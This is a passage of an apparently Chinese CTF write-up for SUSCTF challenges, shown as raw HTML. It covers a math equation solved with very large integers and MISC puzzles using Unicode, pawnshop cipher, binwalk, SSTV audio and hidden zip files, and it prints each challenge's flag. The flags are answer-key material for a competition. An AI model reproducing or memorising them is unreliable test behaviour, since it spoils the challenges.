punctuation\">(</span>decrypt<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token comment\"># msg = 'susctf'</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token comment\"># getk(msg, res)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># k = \"qkxjuk\"</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;</pre></td></tr><tr><td data-num=\"88\"></td><td><pre>'''</pre></td></tr></table></figure><p>运行后得到如下结果：</p>\n<p><img data-src=\"image-20231016083557773.png\" alt=\"image-20231016083557773\"></p>\n<p>加上前面的 susctf 就可以得到正确的 flag：</p>\n<p><code>susctf&#123;afaab6c3-04ed-41c3-bf78-a040377ff146&#125;</code></p>\n<h3 id=\"ezmath\"><a class=\"markdownIt-Anchor\" href=\"#ezmath\">#</a> ezMath</h3>\n<p>题目如下：求出满足下列式子的最小正整数解 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>，</mtext><mi>b</mi><mtext>，</mtext><mi>c</mi></mrow><annotation encoding=\"application/x-tex\">a，b，c</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">b</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">c</span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mfrac><mi>a</mi><mrow><mi>b</mi><mo>+</mo><mi>c</mi></mrow></mfrac><mo>+</mo><mfrac><mi>b</mi><mrow><mi>a</mi><mo>+</mo><mi>c</mi></mrow></mfrac><mo>+</mo><mfrac><mi>c</mi><mrow><mi>a</mi><mo>+</mo><mi>b</mi></mrow></mfrac><mo>=</mo><mn>10</mn></mrow><annotation encoding=\"application/x-tex\">\\frac{a}{b+c} +\\frac{b}{a+c}+\\frac{c}{a+b} =10\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.8768900000000002em;vertical-align:-0.7693300000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.10756em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">c</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7693300000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.14077em;vertical-align:-0.7693300000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.37144em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">c</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7693300000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.8768900000000002em;vertical-align:-0.7693300000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.10756em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">b</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7693300000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span></span></span></span></span></p>\n<p>这一题感觉是纯粹的数学问题，在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYXRoLnN0YWNrZXhjaGFuZ2UuY29tL3F1ZXN0aW9ucy80MDI1MzcvZmluZC1pbnRlZ2VyLWluLXRoZS1mb3JtLWZyYWNhYmMtZnJhY2JjYS1mcmFjY2Fi\">网上</span>找到了相关解的答案如下所示：</p>\n<p><img data-src=\"image-20231014234349719.png\" alt=\"image-20231014234349719\"></p>\n<p>因而</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mo>=</mo><mn>22185598160238070419680451885431654175988385793202828558181254940463484424373750274401154</mn><mspace linebreak=\"newline\"></mspace><mn>9757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</mn></mrow><annotation encoding=\"application/x-tex\">a=22185598160238070419680451885431654175988385793202828558181254940463484424373750274401154\\\\9757448453135493556098964216532950604590733853450272184987603430882682754171300742698179931849310347</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">4</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">7</span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>b</mi><mo>=</mo><mn>269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663</mn><mspace linebreak=\"newline\"></mspace><mn>156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</mn></mrow><annotation encoding=\"application/x-tex\">b=269103113846520710198086599018316928810831097261381335767926880507079911347095440987749703663\\\\156874995907158014866846058485318408629957749519665987782327830143454337518378955846463785600977</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">b</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">3</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">7</span></span></span></span></p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><mn>48623787453806426267373181014849776372190573235646589076866533395997144547905591309463209539</mn><mspace linebreak=\"newline\"></mspace><mn>38197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</mn></mrow><annotation encoding=\"application/x-tex\">c=48623787453806426267373181014849776372190573235646589076866533395997144547905591309463209539\\\\38197181210525554039710122136086190642013402927952831079021210585653078786813279351784906397934209</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">7</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">7</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">4</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">9</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">3</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">6</span><span class=\"mord\">0</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">9</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">5</span><span class=\"mord\">2</span><span class=\"mord\">8</span><span class=\"mord\">3</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">2</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">8</span><span class=\"mord\">5</span><span class=\"mord\">6</span><span class=\"mord\">5</span><span class=\"mord\">3</span><span class=\"mord\">0</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">7</span><span class=\"mord\">8</span><span class=\"mord\">4</span><span class=\"mord\">9</span><span class=\"mord\">0</span><span class=\"mord\">6</span><span class=\"mord\">3</span><span class=\"mord\">9</span><span class=\"mord\">7</span><span class=\"mord\">9</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">9</span></span></span></span></p>\n<p>在网页中输入以上内容后就可以得到 flag：</p>\n<p><img data-src=\"image-20231016090703648.png\" alt=\"image-20231016090703648\"></p>\n<p><code>susctf&#123;480ffdaf-a6bf-4b70-abb0-3fd0f2c3aeae&#125;</code></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"百团大战改\"><a class=\"markdownIt-Anchor\" href=\"#百团大战改\">#</a> 百团大战改</h3>\n<p>题目如下所示：</p>\n<p><img data-src=\"image-20231016090935860.png\" alt=\"image-20231016090935860\"></p>\n<p>二维码扫描后得到如下结果</p>\n<p>Unicode：</p>\n<pre><code>\\u58eb\\u4eba\\u0020\\u5927\\u571f\\u0020\\u5927\\u4eba\\u0020\\u4e2d\\u53e3\\u0020\\u4e2d\\u4eba\\u0020\\u4eba\\u5de5\\u0020\\u592b\\u7f8a\\u0020\\u4e2d\\u7530\\u0020\\u592b\\u592b\\u0020\\u4eba\\u4eba\\u0020\\u4eba\\u7531\\u0020\\u5929\\u4eba\\u0020\\u4eba\\u53e3\\u0020\\u4e2d\\u4eba\\u0020\\u738b\\u5927\\u0020\\u4e2d\\u53e3\\u0020\\u592b\\u5927\n</code></pre>\n<p>将上述 Unicode 转换为汉字：</p>\n<pre><code>士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大\n</code></pre>\n<p>一看就知道这是当铺密码，进行解码得到以下数字。</p>\n<pre><code>53 55 53 20 23 34 79 20 77 33 31 63 30 23 65 20 75\n</code></pre>\n<p>猜测以上数字为 ASCII 码的 16 进制数字，对其进行转换可以得到如下内容：</p>\n<pre><code>SUS #4y w31c0#e u\n</code></pre>\n<p>直接提交这个内容是不正确的，推测图片中隐藏有其他内容，对 png 文件使用 binwalk 进行检查，发现了隐藏的 zip 文件，但是需要密码。那上面的字符串进行尝试，发现密码正确，得到剩下的部分：</p>\n<p><img data-src=\"image-20231016091906862.png\" alt=\"image-20231016091906862\"></p>\n<p>_join us!</p>\n<p>对所有内容进行拼接，得到 flag：</p>\n<p><code>susctf&#123;SUS #4y w31c0#e u_join us!&#125;</code></p>\n<h3 id=\"sustv\"><a class=\"markdownIt-Anchor\" href=\"#sustv\">#</a> SUSTV</h3>\n<p>本题拿到音频后，发现最后一段的声音非常的不和谐，猜测这段声音中隐藏的有信息，在网上找到了解这种题目的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93cC5jdGYuc2hvdy9kLzEwMQ==\">方法</span>，下载 SSTV 软件，使用虚拟声卡将音乐输入进去，可以得到一张二维码：</p>\n<p><img data-src=\"image-20231014145417282.png\" alt=\"image-20231014145417282\"></p>\n<p>扫码就可以拿到 flag  <code>susctf&#123;b7c55a86-56f4-4ebe-ba57-03d3cae609ea&#125;</code></p>\n<h3 id=\"can_u_find_meeeeee\"><a class=\"markdownIt-Anchor\" href=\"#can_u_find_meeeeee\">#</a> Can_u_find_meeeeee?</h3>\n<p>题目为一个 eee 文件：</p>\n<p><img data-src=\"image-20231016092943497.png\" alt=\"image-20231016092943497\"></p>\n<p>扔进 010 中进行查看，发现开头为 50 4B 03 04：</p>\n<p><img data-src=\"image-20231016093108356.png\" alt=\"image-20231016093108356\"></p>\n<p>典型的 zip 文件，改后缀。里面文件很多，把查看隐藏文件打开，进行查找，可以找到一个隐藏的文件夹 <code>sdsda</code> ，其中含有一个隐藏文件  <code>.me</code> ：</p>\n<p><img data-src=\"image-20231014124907074.png\" alt=\"image-20231014124907074\"></p>\n<p>打开后是乱码，但是最下面有一段：</p>\n<p><img data-src=\"image-20231014124944686.png\" alt=\"image-20231014124944686\"></p>\n<p>提取出来为： <code>susctf&#123;S8KlL4/mSxg9efLxKsk5eiPJOf/rKlG9K4hXS8gmTfGtKxGk&#125;</code> ，直接提交发现不对，觉得应该是加密过的，拿到 cyberchef 里面 magic 一下得到正确的 flag</p>\n<p><img data-src=\"image-20231014125102495.png\" alt=\"image-20231014125102495\"></p>\n<p><code>susctf&#123;066f072e-96fc-d9b4-01ca-b1a057513ba5&#125;</code></p>\n<h3 id=\"算术\"><a class=\"markdownIt-Anchor\" href=\"#算术\">#</a> 算术！</h3>\n<p>题目：</p>\n<p><img data-src=\"image-20231014141431854.png\" alt=\"image-20231014141431854\"></p>\n<p>本题目根据 arithmetic coding 